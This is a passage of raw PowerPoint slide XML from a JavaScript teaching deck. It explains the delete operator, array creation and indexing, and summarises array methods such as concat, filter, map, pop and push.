                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>delete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deletes global x and returns true</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FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>delete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n</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returns false and fails</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FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>delete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1st item of a now undefined</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B06090202040302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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D9D7506D-BEAE-4F38-A967-8F6B1FFAFC0B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Array</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4BB87A0F-560B-46F9-9BF5-96E0B98DAD08}"/>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sz="2400" dirty="0"/>
              <a:t>JavaScript arrays are mutable list-alike objects. Array elements can be any JavaScript primitive type or any object, also another array.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Initializing</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 = new Array(1, "cat");</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 = Array(1, "cat"); </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 = [1, "cat"];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Empty array</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 = new Array()</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 = [];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>size of an array</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>a.length</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Array indexes are integers, which begin with 0. Indexing is done using square brackets [index]</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a[0] = "first";</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>a[1] = 'second';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pP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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AC707571-49BF-40D8-8C85-E93D0AE2ECA9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Array Methods A-F</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2B1A999D-97F2-4752-AC30-A1951A7B1438}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>concat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>value1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>,…) = Returns a new array where the old array is concatenated plain values or another arrow provided as parameters</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>entries() = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>returns a new Array Iterator object that contains the key/value pairs for each index in the array.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>every(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>callback</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>) =</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> tests whether all elements in the array pass the test implemented by the provided </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>callback</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> function.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>fill(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>value[, start[, end]]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>= fills all the elements of an array from a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>start</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> index to an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>end</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> index with a static </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>filter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>callback(element[, index[, array]])[, thisArg]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>) = creates a new array with all elements that pass the test implemented by the provided function.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>find</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>callback[, thisArg]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>) = returns the value of the first element in the array that satisfies the provided </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>callback</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> function. Otherwise undefined is returned.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>flat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>[depth]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>) method creates a new array with all sub-array elements concatenated into it recursively up to the specified </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>depth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>flatMap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>callback(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>currentValue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>[, index[, array]]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>) = first maps each element using a mapping function, then flattens the result into a new array. It is identical to a map followed by a flat of depth 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>forEach</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>callback[, thisArg]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>) executes a provided function once for each array element.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pP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70C7CF1C-1088-4BE8-BC24-AAC10891DE8E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Array Methods I-P</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD45F571-8C7D-4BC2-A25A-08E5AEE75450}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1417638"/>
            <a:ext cx="10972800" cy="5251722"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>includes(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>= returns true if array includes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> in it</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>indexOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>searchElement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>[, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>fromIndex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>) = returns the first index at which a given element can be found in the array, or -1 if it is not present.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>separator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>) = convert each element of array into a string and join them into one string using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>separator </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>in between. If no separator is given then comma (,) is used.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>keys() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>returns a new Array Iterator object that contains the keys for each index in the array. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>lastIndexOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>searchElement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>[, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>fromIndex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>) returns the last index at which a given element can be found in the array, or -1 if it is not present. The array is searched backwards, starting at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>fromIndex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>map</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>callback(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>currentValue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>[, index[, array]]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>) = creates a new array with the results of calling a provided function on every element in the calling array.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>pop</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>() = deletes the last element of the array and returns it</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>push</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>(value1, …) = adds new values to the end of the array</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pP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B546EB3B-7BA8-4864-B6F4-E2F971CD2C6B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Array Methods R-Z</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97283" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{055F84FD-5A96-4CFE-8630-D3F15BD56BE2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4853136"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" b="1" dirty="0"/>
              <a:t>reduce</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000" i="1" dirty="0"/>
